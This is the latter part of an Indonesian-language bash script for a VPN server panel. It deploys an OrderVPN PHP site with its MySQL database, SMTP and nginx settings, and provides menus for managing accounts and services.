    echo -e "  ${CYAN}Mengunduh source web OrderVPN...${NC}"

    local script_dir
    script_dir=$(dirname "$(realpath "${BASH_SOURCE[0]}" 2>/dev/null || echo "${BASH_SOURCE[0]}")")
    local local_tar="${script_dir}/ordervpn-src.tar.gz"

    rm -f "$tmp"

    if [[ -f "$local_tar" ]]; then
        cp "$local_tar" "$tmp"
        echo -e "  ${GREEN}  Menggunakan tarball lokal${NC}"
    else
        if ! curl -fsSL --max-time 120 --retry 3 -o "$tmp" "$ORDERVPN_TAR_URL"; then
            echo -e "  ${RED}  Gagal mengunduh source web${NC}"
            return 1
        fi
    fi

    if [[ "$ORDERVPN_TAR_SHA256" != "PLACEHOLDER_SHA256" && -n "$ORDERVPN_TAR_SHA256" ]]; then
        local dl_sha
        dl_sha=$(sha256sum "$tmp" | awk '{print $1}')
        if [[ "$dl_sha" != "$ORDERVPN_TAR_SHA256" ]]; then
            echo -e "  ${RED}  Hash SHA256 tidak cocok!${NC}"
            echo -e "  ${DIM}Expected: $ORDERVPN_TAR_SHA256${NC}"
            echo -e "  ${DIM}Got:      $dl_sha${NC}"
            rm -f "$tmp"
            return 1
        fi
        echo -e "  ${GREEN}  Hash SHA256 cocok${NC}"
    fi

    local env_backup=""
    if [[ -f "$dest/.env" ]]; then
        env_backup=$(mktemp /tmp/ordervpn-env.XXXXXX)
        cp "$dest/.env" "$env_backup"
    fi

    mkdir -p "$dest"
    rm -rf "${dest}"/*

    if ! tar -xzf "$tmp" -C "$dest" --strip-components=1 2>/dev/null; then
        echo -e "  ${RED}  Gagal mengekstrak source web${NC}"
        return 1
    fi

    if [[ -n "$env_backup" && -f "$env_backup" ]]; then
        cp "$env_backup" "$dest/.env"
        rm -f "$env_backup"
    fi

    chown -R www-data:www-data "$dest"
    find "$dest" -type d -exec chmod 755 {} \;
    find "$dest" -type f -exec chmod 644 {} \;

    echo -e "  ${GREEN}  Source web diekstrak ke $dest${NC}"
    return 0
}

_ordervpn_setup_db() {
    local db_name="ordervpn_db"
    local db_user="ordervpn"
    local db_pass=""

    if [[ -f /root/.ordervpn_db ]]; then
        db_pass=$(grep "^DB_PASS=" /root/.ordervpn_db | cut -d= -f2-)
    elif [[ -f /var/www/html/ordervpn/.env ]]; then
        db_pass=$(grep "^DB_PASS=" /var/www/html/ordervpn/.env | cut -d= -f2-)
    fi

    if [[ -z "$db_pass" ]]; then
        db_pass=$(openssl rand -base64 32 | tr -dc 'a-zA-Z0-9' | head -c 24)
    fi

    echo -e "  ${CYAN}Setup database OrderVPN...${NC}"

    if ! command -v mysql >/dev/null 2>&1; then
        _wait_apt_lock
        DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-server >/dev/null 2>&1 || true
    fi

    systemctl start mysql 2>/dev/null || systemctl start mariadb 2>/dev/null || true

    local mysql_cmd="mysql -u root"
    if ! $mysql_cmd -e "SELECT 1" >/dev/null 2>&1; then
        mysql_cmd="sudo mysql -u root"
    fi

    $mysql_cmd <<EOF
CREATE DATABASE IF NOT EXISTS \`${db_name}\` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER IF NOT EXISTS '${db_user}'@'localhost' IDENTIFIED BY '${db_pass}';
ALTER USER '${db_user}'@'localhost' IDENTIFIED BY '${db_pass}';
GRANT ALL PRIVILEGES ON \`${db_name}\`.* TO '${db_user}'@'localhost';
FLUSH PRIVILEGES;
EOF

    cat > /var/www/html/ordervpn/.env <<EOENV
DB_HOST=localhost
DB_USER=${db_user}
DB_PASS=${db_pass}
DB_NAME=${db_name}
EOENV
    chmod 600 /var/www/html/ordervpn/.env
    chown www-data:www-data /var/www/html/ordervpn/.env

    if [[ -f "/var/www/html/ordervpn/install.sql" ]]; then
        $mysql_cmd "${db_name}" < /var/www/html/ordervpn/install.sql
    fi

    cat > /root/.ordervpn_db <<EODB
DB_USER=${db_user}
DB_PASS=${db_pass}
DB_NAME=${db_name}
DB_HOST=localhost
EODB
    chmod 600 /root/.ordervpn_db

    echo -e "  ${GREEN}  Database OrderVPN ready${NC}"
}

# ============================================================
# OrderVPN Web — SMTP Setup Prompt
# ============================================================

_ordervpn_setup_smtp() {
    local env_file="/var/www/html/ordervpn/.env"
    if [[ ! -f "$env_file" ]]; then
        echo -e "  ${YELLOW}  .env belum ada, melewati setup SMTP${NC}"
        return 0
    fi

    echo -e "  ${CYAN}Setup SMTP untuk email OTP...${NC}"
    echo -e "  ${DIM}Contoh: smtp.gmail.com:587 dengan App Password${NC}"
    echo ""

    local skip
    read -rp "  Konfigurasi SMTP sekarang? [Y/n]: " skip
    if [[ "$skip" =~ ^[Nn] ]]; then
        echo -e "  ${YELLOW}  Setup SMTP dilewati${NC}"
        return 0
    fi

    local smtp_host smtp_port smtp_user smtp_pass smtp_from smtp_secure

    read -rp "  SMTP Host [smtp.gmail.com]: " smtp_host
    smtp_host="${smtp_host:-smtp.gmail.com}"

    while true; do
        read -rp "  SMTP Port [587]: " smtp_port
        smtp_port="${smtp_port:-587}"
        [[ "$smtp_port" =~ ^[0-9]+$ ]] && break
        echo -e "  ${RED}  Port harus angka${NC}"
    done

    read -rp "  SMTP User [emailkamu@gmail.com]: " smtp_user
    smtp_user="${smtp_user:-emailkamu@gmail.com}"

    read -rsp "  SMTP Password (App Password): " smtp_pass
    echo ""

    read -rp "  SMTP From [${smtp_user}]: " smtp_from
    smtp_from="${smtp_from:-${smtp_user}}"

    read -rp "  SMTP Secure [tls]: " smtp_secure
    smtp_secure="${smtp_secure:-tls}"

    # Hapus baris SMTP lama jika ada
    sed -i '/^SMTP_/d' "$env_file"

    # Tambahkan baris SMTP baru dengan nilai di-quote
    {
        echo ""
        echo "SMTP_HOST=\"${smtp_host}\""
        echo "SMTP_PORT=\"${smtp_port}\""
        echo "SMTP_USER=\"${smtp_user}\""
        echo "SMTP_PASS=\"${smtp_pass}\""
        echo "SMTP_FROM=\"${smtp_from}\""
        echo "SMTP_SECURE=\"${smtp_secure}\""
    } >> "$env_file"

    chmod 600 "$env_file"
    chown www-data:www-data "$env_file"

    echo -e "  ${GREEN}  SMTP config disimpan${NC}"
}



_ordervpn_nginx_config() {
    echo -e "  ${CYAN}Setup nginx untuk OrderVPN...${NC}"

    if ! command -v nginx >/dev/null 2>&1; then
        _wait_apt_lock
        DEBIAN_FRONTEND=noninteractive apt-get install -y nginx >/dev/null 2>&1 || true
    fi

    if ! command -v php >/dev/null 2>&1 || ! ls /run/php/php*-fpm.sock >/dev/null 2>&1; then
        _wait_apt_lock
        DEBIAN_FRONTEND=noninteractive apt-get install -y php-fpm php-mysql php-mbstring php-xml php-curl php-zip php-gd >/dev/null 2>&1 || true
    fi

    local php_sock
    php_sock=$(ls /run/php/php*-fpm.sock 2>/dev/null | head -1)
    if [[ -z "$php_sock" ]]; then
        for svc in $(systemctl list-unit-files --type=service 2>/dev/null | grep -oP 'php[0-9]+\.[0-9]+-fpm\.service' | sort -u); do
            systemctl enable --now "${svc%.service}" 2>/dev/null || true
        done
        php_sock=$(ls /run/php/php*-fpm.sock 2>/dev/null | head -1)
    fi

    if [[ -z "$php_sock" ]]; then
        echo -e "  ${YELLOW}  PHP-FPM socket tidak ditemukan, melewati nginx config${NC}"
        return 1
    fi

    local cfg_file=""
    if [[ -f /etc/nginx/sites-enabled/default ]]; then
        cfg_file="/etc/nginx/sites-enabled/default"
    else
        cfg_file=$(find /etc/nginx/sites-enabled -maxdepth 1 -type f | head -1)
    fi

    if [[ -z "$cfg_file" || ! -f "$cfg_file" ]]; then
        cfg_file="/etc/nginx/sites-available/default"
        touch "$cfg_file"
    fi

    if ! grep -q "# OrderVPN location start" "$cfg_file" 2>/dev/null; then
        cat >> "$cfg_file" <<"EOCFG"

# OrderVPN location start
location /ordervpn {
    root /var/www/html;
    index index.php index.html;
    try_files $uri $uri/ /ordervpn/index.php?$query_string;

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:__PHP_SOCK__;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location ~ /ordervpn/\.(?!well-known).* {
        deny all;
    }
}
EOCFG
        sed -i "s|__PHP_SOCK__|${php_sock}|g" "$cfg_file"
    fi

    nginx -t && systemctl restart nginx
    echo -e "  ${GREEN}  Nginx config applied${NC}"
}

# ============================================================
# MAIN MENU INTERACTIVE
# ============================================================

main_menu() {
    while true; do
        show_system_info
        show_menu
        echo ""
        read -rp "  Select [0-24]: " menu_choice
        case $menu_choice in
            1) menu_ssh ;;
            2) menu_vmess ;;
            3) menu_vless ;;
            4) menu_trojan ;;
            5) _menu_list_all ;;
            6) menu_renew ;;
            7) check_expired_accounts ;;
            8) delete_expired_run ;;
            9) menu_telegram_bot ;;
            10) change_domain ;;
            11) menu_ssl ;;
            12) optimize_vpn ;;
            13) restart_menu ;;
            14) run_speedtest ;;
            15) _menu_backup ;;
            16) _menu_restore ;;
            17) menu_uninstall ;;
            18) menu_advanced ;;
            19) show_info_port ;;
            20) install_zivpn_udp ;;
            21) deploy_web_menu ;;
            22) _adv_ddos_protection ;;
            23) show_traffic ;;
            24) run_health_check ;;
            0) clear; echo -e "  ${GREEN}Goodbye!${NC}"; break ;;
            *) echo -e "  ${RED}Invalid!${NC}"; sleep 1 ;;
        esac
    done
}

# ── Helper: Check Expired Accounts ──
check_expired_accounts() {
    clear
    print_menu_header "CHECK EXPIRED ACCOUNTS"
    local today; today=$(date +%s)
    local any=0
    for f in "$AKUN_DIR"/*.txt; do
        [[ ! -f "$f" ]] && continue
        local exp_str; exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)
        local exp_ts; exp_ts=$(date -d "${exp_str//,/}" +%s 2>/dev/null)
        if [[ -n "$exp_ts" && $exp_ts -lt $today ]]; then
            any=1
            local fname; fname=$(basename "$f" .txt)
            echo -e "  ${RED}EXPIRED${NC} : ${fname}  (${exp_str})"
        fi
    done
    [[ $any -eq 0 ]] && echo -e "  ${GREEN}✔ No expired accounts!${NC}"
    echo ""; read -rp "  Tekan Enter..."
}

# ── Helper: Delete Expired (with restart) ──
delete_expired_run() {
    clear
    print_menu_header "DELETE EXPIRED ACCOUNTS"
    delete_expired
    xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1 && systemctl restart xray 2>/dev/null || true
    echo -e "  ${GREEN}✔ Expired accounts cleaned!${NC}"
    sleep 2
}

# ── Helper: Restart Services Menu ──
restart_menu() {
    clear
    print_menu_header "RESTART SERVICES"
    echo -e "  ${WHITE}[1]${NC} Restart XRAY"
    echo -e "  ${WHITE}[2]${NC} Restart NGINX"
    echo -e "  ${WHITE}[3]${NC} Restart HAPROXY"
    echo -e "  ${WHITE}[4]${NC} Restart DROPBEAR"
    echo -e "  ${WHITE}[5]${NC} Restart SSH"
    echo -e "  ${WHITE}[6]${NC} Restart KEEPALIVE"
    echo -e "  ${WHITE}[7]${NC} Restart ALL"
    echo -e "  ${RED}[0]${NC} Kembali"
    echo ""
    read -rp "  Select: " rs
    case $rs in
        1) systemctl restart xray 2>/dev/null; echo -e "  ${GREEN}✔ XRAY restarted${NC}"; sleep 1 ;;
        2) if nginx -t 2>/dev/null && systemctl restart nginx; then echo -e "  ${GREEN}✔ NGINX restarted${NC}"; else echo -e "  ${RED}✘ NGINX config error, restart skipped${NC}"; fi; sleep 1 ;;
        3) systemctl restart haproxy 2>/dev/null; echo -e "  ${GREEN}✔ HAPROXY restarted${NC}"; sleep 1 ;;
        4) systemctl restart dropbear 2>/dev/null; echo -e "  ${GREEN}✔ DROPBEAR restarted${NC}"; sleep 1 ;;
        5) systemctl restart "$(get_ssh_service_name)" 2>/dev/null; echo -e "  ${GREEN}✔ SSH restarted${NC}"; sleep 1 ;;
        6) systemctl restart vpn-keepalive 2>/dev/null; echo -e "  ${GREEN}✔ KEEPALIVE restarted${NC}"; sleep 1 ;;
        7) for s in xray nginx haproxy dropbear "$(get_ssh_service_name)" vpn-keepalive; do systemctl restart "$s" 2>/dev/null; done; echo -e "  ${GREEN}✔ ALL restarted${NC}"; sleep 2 ;;
        0) return ;;
    esac
}

# ── Helper: Traffic Display ──
show_traffic() {
    clear
    print_menu_header "TRAFFIC MONITOR"
    if command -v vnstat >/dev/null 2>&1; then
        vnstat -m 2>/dev/null || vnstat 2>/dev/null
    else
        echo -e "  ${YELLOW}vnstat not installed.${NC}"
        echo -e "  ${DIM}Run: apt-get install -y vnstat${NC}"
    fi
    echo ""; read -rp "  Tekan Enter..."
}

# ── Helper: Health Check ──
run_health_check() {
    clear
    print_menu_header "HEALTH CHECK"
    echo -e "  ${CYAN}CPU:${NC} $(_get_cpu_usage)%"
    echo -e "  ${CYAN}RAM:${NC} $(free -m | awk '/Mem:/{printf "%d/%d MB (%.0f%%)",\$3,\$2,(\$3/\$2)*100}')"
    echo -e "  ${CYAN}Disk:${NC} $(df -h / | awk 'NR==2{printf "%s/%s (%s)",\$3,\$2,\$5}')"
    echo -e "  ${CYAN}Uptime:${NC} $(uptime -p 2>/dev/null || uptime)"
    echo ""
    for svc in xray nginx haproxy dropbear ssh; do
        local status; status=$(systemctl is-active "$svc" 2>/dev/null || echo "N/A")
        local color="$GREEN"; [[ "$status" != "active" ]] && color="$RED"
        echo -e "  ${color}●${NC} $svc: $status"
    done
    if [[ -f /root/quick-test.sh ]]; then
        echo ""; echo -e "  ${CYAN}Running quick-test.sh...${NC}"
        bash /root/quick-test.sh 2>/dev/null | tail -20
    fi
    echo ""; read -rp "  Tekan Enter..."
}

# ── Helper: Deploy Web Menu ──
deploy_web_menu() {
    clear
    print_menu_header "ORDERVPN WEB"
    setup_web_domain
    deploy_web_page
    _ordervpn_deploy_files 2>/dev/null || true
    _ordervpn_setup_db 2>/dev/null || true
    _ordervpn_setup_smtp
    _ordervpn_nginx_config 2>/dev/null || true
    _ordervpn_security_harden 2>/dev/null || true
    echo -e "  ${GREEN}✔ Web deployed!${NC}"
    sleep 2
}

# ============================================================
# CLI
# ============================================================

vpn_cli() {
    case "${1:-}" in
        menu)            main_menu ;;
        install)         auto_install ;;
        web|deploy_web)  setup_web_domain
                         deploy_web_page
                         _ordervpn_deploy_files
                         _ordervpn_security_harden || true ;;
        security)        _ordervpn_security_harden ;;
        status)          show_system_info; show_info_port ;;
        list)            list_accounts ;;
        delete_expired)  delete_expired
                         xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1 && systemctl restart xray 2>/dev/null || true ;;
        backup)          _menu_backup ;;
        restore)         _menu_restore ;;
        help|--help|-h)
            echo "VPN Panel v3.12.0 — Single File"
            echo ""
            echo "Commands:"
            echo "  menu            Buka menu interaktif"
            echo "  install         Installasi awal"
            echo "  web             Deploy web page + security hardening"
            echo "  security        Terapkan security hardening (CSRF, OTP 8-digit, rate limit)"
            echo "  status          Tampilkan status sistem"
            echo "  list            List semua akun"
            echo "  delete_expired  Hapus akun expired (cron)"
            echo "  backup          Backup data"
            echo "  restore         Restore data"
            ;;
        *) main_menu ;;
    esac
}

# ============================================================
# MAIN
# ============================================================

main() {
    echo -e "  ${CYAN}[INFO]${NC} Starting VPN Panel (args: ${*:-none})"

    detect_ubuntu_version
    detect_container
    detect_firewall_backend
    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)

    # Auto-heal cron
    if ! crontab -l 2>/dev/null | grep -q "delete_expired_cron"; then
        (crontab -l 2>/dev/null; echo "0 * * * * bash /root/vpn.sh delete_expired 2>/dev/null") | crontab - 2>/dev/null || true
    fi

    if [[ $# -gt 0 ]]; then
        vpn_cli "$@"
        return 0
    fi

    if [[ ! -f "$DOMAIN_FILE" ]]; then
        auto_install
    fi

    setup_menu_command
    main_menu

    if [[ -n "$SSH_CONNECTION" || -n "$SSH_TTY" ]]; then
        exec bash --login
    fi
}

require_root

main "$@"
